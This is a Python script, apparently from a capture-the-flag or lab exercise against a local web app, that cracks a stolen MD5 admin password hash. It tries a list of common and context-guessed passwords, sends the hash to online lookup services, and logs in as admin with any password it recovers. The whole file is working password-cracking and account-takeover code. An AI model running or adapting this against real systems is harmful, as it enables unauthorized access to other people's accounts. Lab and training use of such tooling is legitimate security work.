import requests
import hashlib
import itertools
import string
import time

base_url = "http://127.0.0.1:33038/index.php"
target_hash = "7d39307ae824e70052c0aa16816a9b16"

def login(password):
    data = {
        "username": "admin",
        "password": password,
        "submit": "submit"
    }
    try:
        response = requests.post(base_url, data=data, timeout=10)
        return response.text
    except:
        return None

print("[*] Attempting to crack the MD5 hash offline...")
print(f"[*] Target hash: {target_hash}")

# Try a wordlist of common passwords
def try_passwords(passwords):
    for pwd in passwords:
        md5_hash = hashlib.md5(pwd.encode()).hexdigest()
        if md5_hash == target_hash:
            print(f"[CRACKED] '{pwd}' -> MD5 = {target_hash}")
            # Test login
            result = login(pwd)
            print(f"Login result with '{pwd}': {result}")
            return pwd
    return None

# Extended wordlist
wordlist = [
    "admin", "password", "123456", "qwerty", "admin123", "root", "toor", "12345678",
    "password123", "test", "guest", "administrator", "admin_password", "secret",
    "P@ssw0rd", "Admin123", "changeme", "letmein", "welcome", "Passw0rd", "login",
    "master", "superadmin", "webadmin", "system", "access", "user", "pass", "key",
    "auth", "token", "default", "password1", "123456789", "1234567890", "111111",
    "123123", "987654321", "qwe123", "123qwe", "adminadmin", "password12",
    "Password1", "Password", "admin1", "root123", "toor123", "pass123", "secret123",
    "passw0rd", "P@ssword", "P@ssw0rd123", "Welcome1", "Welcome123", "admin!@#",
    "root@123", "password!", "pass!123", "Admin@123", "admin123!", "imsuser", "imspassword",
    # Common default passwords from security lists
    "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "qazwsx", "qwerty123", "qwertyuiop",
    "lovely", "princess", "dragon", "baseball", "football", "monkey", "sunshine",
    "iloveyou", "trustno1", "abc123", "ashley", "charlie", "michael", "654321"
]

found = try_passwords(wordlist)
if found:
    print(f"\n[+] SUCCESS! Password cracked: {found}")
else:
    print("\n[*] Not in common wordlist, trying online lookup...")
    
    # Try to lookup via some API or service
    # Let's try crackstation's API or similar
    import urllib.request
    
    services = [
        f"https://api.hashcheck.io/v1/hash/{target_hash}",
        f"https://hashtoolkit.net/api/hash/{target_hash}",
    ]
    
    for service in services:
        try:
            print(f"[*] Trying {service}")
            req = urllib.request.Request(service, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                result = response.read().decode()
                print(f"Response: {result[:200]}")
        except Exception as e:
            print(f"  Error: {type(e).__name__}")
    
    # Alternative: Try hashed variations in local DBs
    print("\n[*] Trying variations based on DB schema context...")
    db_context_candidates = [
        "paybuddies", "paybud", "budpay", "pay", "buddy", "portal", "app", "dbadmin",
        "sqladmin", "mysqladmin", "webuser", "developer", "testuser", "production",
        "prod", "dev", "staging", "backup", "maintenance"
    ]
    
    for candidate in db_context_candidates:
        md5_result = hashlib.md5(candidate.encode()).hexdigest()
        if md5_result == target_hash:
            print(f"[CRACKED] '{candidate}' -> {target_hash}")
            login_result = login(candidate)
            print(f"Login result: {login_result}")
            break
        
        # Also try with common suffixes
        for suffix in ["123", "1234", "01", "!", "@", "#", "999", "007", "00"]:
            candidate_with_suffix = candidate + suffix
            md5_result = hashlib.md5(candidate_with_suffix.encode()).hexdigest()
            if md5_result == target_hash:
                print(f"[CRACKED] '{candidate_with_suffix}' -> {target_hash}")
                login_result = login(candidate_with_suffix)
                print(f"Login result: {login_result}")
                break
        else:
            continue
        break

